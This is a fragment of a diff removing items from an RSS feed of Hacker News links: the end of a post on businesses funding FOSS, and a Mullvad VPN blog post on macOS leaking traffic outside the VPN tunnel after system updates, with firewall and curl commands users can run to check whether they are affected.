-<li>Exercise our organisational business sense and strategy to help the FOSS ecosystem thrive, without which our business cannot exist.</li>
-<li>Encourage and apply a bit of peer-pressure on other businesses to setup structured financial support programmes for FOSS.</li>
-<li>Contribute to existing FOSS funding models and to the sustainability conversations and debates.</li>
-<li>As a bonus: Explore whether the <code>funding.json</code> manifest experiment can bring discoverability to the financial needs of FOSS projects on a large scale.</li>
-</ul>
-<p>Let us see how this goes.</p>
-
-
-        </div><!-- post -->
-      </div>
-    </article>
-</section></div>]]></description>
-        </item>
-        <item>
-            <title><![CDATA[Mullvad VPN: macOS sometimes leaks traffic after system updates (379 pts)]]></title>
-            <link>https://mullvad.net/en/blog/macos-sometimes-leaks-traffic-after-system-updates</link>
-            <guid>41856883</guid>
-            <pubDate>Wed, 16 Oct 2024 08:37:23 GMT</pubDate>
-            <description><![CDATA[<p>URL: <a href="https://mullvad.net/en/blog/macos-sometimes-leaks-traffic-after-system-updates">https://mullvad.net/en/blog/macos-sometimes-leaks-traffic-after-system-updates</a>, See on <a href="https://news.ycombinator.com/item?id=41856883">Hacker News</a></p>
-<div id="readability-page-1" class="page"><div><!-- HTML_TAG_START --><p>We have found that you could be leaking traffic on macOS after system updates. To our current knowledge a reboot resolves it. We are currently investigating this and will follow up with more information.</p>
-<h2>The current state</h2>
-<p>In this scenario the macOS firewall does not seem to function correctly and is disregarding firewall rules. Most traffic will still go inside the VPN tunnel since the routing table specifies that it should. Unfortunately apps are not required to respect the routing table and can send traffic outside the tunnel if they try to. Some examples of apps that do this are Apple’s own apps and services since macOS 14.6, up until a recent 15.1 beta.</p>
-<h2>What’s next?</h2>
-<p>We’ve reported this to Apple and hopefully we’ll see a fix in the near future. In the meanwhile we will continue to investigate this to be able to provide more information to Apple and to see if there are any workarounds that we can implement in the app.</p>
-<h2>Check if you are affected</h2>
-<p>Run the following commands in a terminal to check if you are affected:</p>
-<p>&nbsp;1. Add a firewall rule that blocks all traffic</p>
-<pre><code>echo "block drop quick all" | sudo pfctl -ef -</code></pre>
-<p>2. Try to send traffic outside the tunnel</p>
-<pre><code>curl https://am.i.mullvad.net/connected</code></pre>
-<p>To clean up after the experiment, disable the firewall and clear all rules.</p>
-<pre><code>sudo pfctl -d</code><br><code>sudo pfctl -f /etc/pf.conf</code></pre>
-<p>It is also possible to check if our app is leaking by doing the following:</p>
-<p>1. Make sure you are not connected to a VPN<br>2. Find the default interface by running the following command in a terminal</p>
-<pre><code>route get mullvad.net | sed -nE 's/.*interface: //p'</code></pre>
-<p>3. Connect to a VPN server using our app<br>4. Run the following command (replace “&lt;interface&gt;” with the interface from step 2)</p>
-<pre><code>curl --interface &lt;interface&gt; https://am.i.mullvad.net/connected</code></pre>
-<p>5. The request should time out if everything is working properly. If there is a response then you are leaking.</p><!-- HTML_TAG_END --></div></div>]]></description>
         </item>
     </channel>
 </rss>
